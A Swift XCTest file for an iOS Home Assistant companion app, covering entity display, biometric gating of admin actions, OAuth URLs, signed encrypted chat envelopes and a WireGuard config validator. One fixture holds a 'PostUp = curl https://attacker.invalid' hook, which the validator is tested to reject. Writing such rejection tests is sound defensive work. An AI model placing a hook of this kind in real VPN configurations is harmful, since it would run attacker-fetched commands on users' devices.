import XCTest
import CryptoKit
@testable import IOSNext

final class IOSNextTests: XCTestCase {
    func testProfileHasStableIdentity() {
        XCTAssertEqual(HomeProfile.timo.id, "timo")
    }

    func testEntityOnState() {
        let entity = HomeAssistantEntity(entityID: "light.example", state: "on", attributes: [:])
        XCTAssertTrue(entity.isOn)
    }

    func testEntityPresentationValues() {
        let entity = HomeAssistantEntity(
            entityID: "light.example",
            state: "unavailable",
            attributes: [
                "friendly_name": .string("Testlicht"),
                "brightness": .number(127.5)
            ]
        )
        XCTAssertEqual(entity.domain, "light")
        XCTAssertEqual(entity.displayName, "Testlicht")
        XCTAssertEqual(entity.stateDisplayName, "Nicht verfügbar")
        XCTAssertFalse(entity.isAvailable)
        XCTAssertEqual(try XCTUnwrap(entity.brightness), 0.5, accuracy: 0.0001)
    }

    func testMediaAttributesAreNormalized() {
        let entity = HomeAssistantEntity(
            entityID: "media_player.example",
            state: "playing",
            attributes: [
                "media_title": .string("Titel"),
                "volume_level": .number(1.4)
            ]
        )
        XCTAssertEqual(entity.mediaTitle, "Titel")
        XCTAssertEqual(entity.volumeLevel, 1)
        XCTAssertTrue(entity.isOn)
    }

    func testRunnerCriticalActionsRequireAuthentication() {
        XCTAssertTrue(RunnerAction.gracefulRestart.requiresBiometrics)
        XCTAssertTrue(RunnerAction.shutdown.requiresBiometrics)
        XCTAssertFalse(RunnerAction.healthCheck.requiresBiometrics)
    }

    func testAdminMutationsRequireFreshBiometrics() {
        XCTAssertFalse(AdminAction.healthCheck.requiresFreshBiometrics)
        XCTAssertTrue(AdminAction.enableMaintenance.requiresFreshBiometrics)
        XCTAssertTrue(AdminAction.clearCache.requiresFreshBiometrics)
        XCTAssertTrue(AdminAction.createBackup.requiresFreshBiometrics)
    }

    func testTimoProfileContainsOnlyVerifiedFavorites() {
        let definition = ProfileCatalog.definition(for: .timo)
        XCTAssertEqual(definition.favoriteEntityIDs, [
            "light.hintergrund_fernseher",
            "light.nachttisch",
            "light.schlafzimmer",
            "media_player.schlafzimmer"
        ])
    }

    func testOAuthAuthorizationURLUsesNativeRedirect() {
        let configuration = HomeAssistantOAuthConfiguration(
            instanceURL: URL(string: "https://ha.example.com")!,
            clientID: URL(string: "https://example.com/ios-next")!
        )
        let url = try! XCTUnwrap(configuration.authorizationURL)
        let items = URLComponents(url: url, resolvingAgainstBaseURL: false)?.queryItems
        XCTAssertEqual(url.path, "/auth/authorize")
        XCTAssertEqual(items?.first(where: { $0.name == "redirect_uri" })?.value, "iosnext://auth")
    }

    func testProductionOAuthClientIDUsesPublishedPage() {
        XCTAssertEqual(
            HomeAssistantOAuthConfiguration.productionClientID.absoluteString,
            "https://nicofroeba16-cell.github.io/ha-ios-next-ios/"
        )
    }

    func testChatEnvelopeEncryptsSignsAndDecrypts() throws {
        let senderKeys = ChatDeviceKeys(
            agreement: Curve25519.KeyAgreement.PrivateKey(),
            signing: Curve25519.Signing.PrivateKey()
        )
        let recipientKeys = ChatDeviceKeys(
            agreement: Curve25519.KeyAgreement.PrivateKey(),
            signing: Curve25519.Signing.PrivateKey()
        )
        let sender = senderKeys.publicIdentity(userID: "nico", deviceID: "iphone")
        let recipient = recipientKeys.publicIdentity(userID: "mika", deviceID: "ipad")
        let plaintext = Data("Nur im RAM".utf8)
        let envelope = try senderKeys.encrypt(
            plaintext,
            kind: .text,
            contentType: "text/plain",
            groupID: "group-test",
            chunkIndex: 0,
            chunkCount: 1,
            sender: sender,
            recipient: recipient,
            createdAt: "2026-09-16T05:00:00Z"
        )
        let ciphertext = try XCTUnwrap(Data(base64Encoded: envelope.ciphertext))
        XCTAssertNotEqual(ciphertext, plaintext)
        XCTAssertEqual(try recipientKeys.decrypt(envelope, sender: sender), plaintext)
    }

    func testChatEnvelopeRejectsCiphertextTampering() throws {
        let senderKeys = ChatDeviceKeys(
            agreement: Curve25519.KeyAgreement.PrivateKey(),
            signing: Curve25519.Signing.PrivateKey()
        )
        let recipientKeys = ChatDeviceKeys(
            agreement: Curve25519.KeyAgreement.PrivateKey(),
            signing: Curve25519.Signing.PrivateKey()
        )
        let sender = senderKeys.publicIdentity(userID: "nico", deviceID: "iphone")
        let recipient = recipientKeys.publicIdentity(userID: "mika", deviceID: "ipad")
        let envelope = try senderKeys.encrypt(
            Data("Original".utf8),
            kind: .text,
            contentType: "text/plain",
            groupID: "tamper-test",
            chunkIndex: 0,
            chunkCount: 1,
            sender: sender,
            recipient: recipient,
            createdAt: "2026-09-16T05:00:00Z"
        )
        let tampered = ChatEnvelope(
            id: envelope.id,
            groupID: envelope.groupID,
            senderUserID: envelope.senderUserID,
            senderDeviceID: envelope.senderDeviceID,
            recipientUserID: envelope.recipientUserID,
            recipientDeviceID: envelope.recipientDeviceID,
            ephemeralPublicKey: envelope.ephemeralPublicKey,
            ciphertext: Data("Manipuliert".utf8).base64EncodedString(),
            signature: envelope.signature,
            messageType: envelope.messageType,
            contentType: envelope.contentType,
            chunkIndex: envelope.chunkIndex,
            chunkCount: envelope.chunkCount,
            createdAt: envelope.createdAt
        )
        XCTAssertThrowsError(try recipientKeys.decrypt(tampered, sender: sender)) { error in
            XCTAssertEqual(error as? ChatError, .invalidSignature)
        }
    }

    func testWireGuardConfigurationAcceptsStrictSubset() throws {
        let key = Data(repeating: 7, count: 32).base64EncodedString()
        let configuration = """
        [Interface]
        PrivateKey = \(key)
        Address = 10.44.0.2/32, fd44::2/128
        DNS = 10.44.0.1
        MTU = 1280

        [Peer]
        PublicKey = \(key)
        AllowedIPs = 10.0.0.0/8, fd44::/64
        Endpoint = vpn.example.com:51820
        PersistentKeepalive = 25
        """
        let parsed = try WireGuardConfigurationValidator.validate(configuration)
        XCTAssertEqual(parsed.interface.addresses, ["10.44.0.2/32", "fd44::2/128"])
        XCTAssertEqual(parsed.peers.first?.endpoint, "vpn.example.com:51820")
    }

    func testWireGuardConfigurationRejectsScripts() {
        let key = Data(repeating: 8, count: 32).base64EncodedString()
        let configuration = """
        [Interface]
        PrivateKey = \(key)
        Address = 10.44.0.2/32
        PostUp = curl https://attacker.invalid

        [Peer]
        PublicKey = \(key)
        AllowedIPs = 10.0.0.0/8
        Endpoint = vpn.example.com:51820
        """
        XCTAssertThrowsError(try WireGuardConfigurationValidator.validate(configuration))
    }

    func testWireGuardConfigurationRejectsInvalidAddressAndDuplicatePeer() {
        let key = Data(repeating: 9, count: 32).base64EncodedString()
        let invalidAddress = """
        [Interface]
        PrivateKey = \(key)
        Address = 999.1.1.1/32

        [Peer]
        PublicKey = \(key)
        AllowedIPs = 10.0.0.0/8
        Endpoint = vpn.example.com:51820
        """
        XCTAssertThrowsError(try WireGuardConfigurationValidator.validate(invalidAddress))

        let duplicatePeer = """
        [Interface]
        PrivateKey = \(key)
        Address = 10.44.0.2/32

        [Peer]
        PublicKey = \(key)
        AllowedIPs = 10.0.0.0/8
        Endpoint = vpn-a.example.com:51820

        [Peer]
        PublicKey = \(key)
        AllowedIPs = 192.168.0.0/16
        Endpoint = vpn-b.example.com:51820
        """
        XCTAssertThrowsError(try WireGuardConfigurationValidator.validate(duplicatePeer))
    }
    func testLiveHACardCatalogCoversEveryLiveDashboardType() {
        XCTAssertEqual(
            Set(LiveHACardType.allCases.map(\.rawValue)),
            Set([
                "sections",
                "grid",
                "conditional",
                "template",
                "entity",
                "custom:mushroom-title-card",
                "custom:mushroom-chips-card",
                "custom:mushroom-template-card",
                "custom:navbar-card",
                "custom:battery-state-card",
                "custom:ios-light-card",
                "custom:ios-media-player"
            ])
        )
        XCTAssertEqual(LiveHACardType.allCases.count, 12)
    }

    func testLiveHACardScreenshotPageArguments() {
        XCTAssertEqual(LiveHACardTestModeView.page(from: ["app"]), 0)
        XCTAssertEqual(LiveHACardTestModeView.page(from: ["app", "--live-card-page=1"]), 1)
        XCTAssertEqual(LiveHACardTestModeView.page(from: ["app", "--live-card-page=2"]), 2)
        XCTAssertEqual(LiveHACardTestModeView.page(from: ["app", "--live-card-page=99"]), 0)
    }

}
